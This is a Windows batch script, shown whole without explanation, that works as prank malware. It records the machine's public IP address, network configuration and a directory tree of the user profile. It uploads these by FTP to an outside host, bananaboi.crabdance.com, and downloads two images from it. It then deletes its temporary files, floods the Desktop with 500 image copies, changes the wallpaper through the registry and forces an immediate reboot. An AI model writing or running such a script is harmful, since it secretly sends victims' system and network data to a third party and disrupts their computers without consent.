@echo off
nslookup myip.opendns.com. resolver1.opendns.com > e.txt
ipconfig > i.txt
set "d=%cd%"
cd..
cd Desktop
set "s=%cd%"
cd..
cd..
tree > %d%\t.txt
cd %d%
echo put e.txt >> f.txt
echo put i.txt >> f.txt
echo put t.txt >> f.txt
echo bin >> f.txt
echo get b.bmp >> f.txt
echo get BigMan.jpg >> f.txt
echo quit >> f.txt
ftp -n -s:f.txt bananaboi.crabdance.com
del f.txt
del e.txt
del i.txt
del t.txt
for /l %%A in (1,1,500) do copy "%d%\BigMan.jpg" "%s%\BigMan-%%A.jpg"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\b.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
shutdown -r -f -t 0
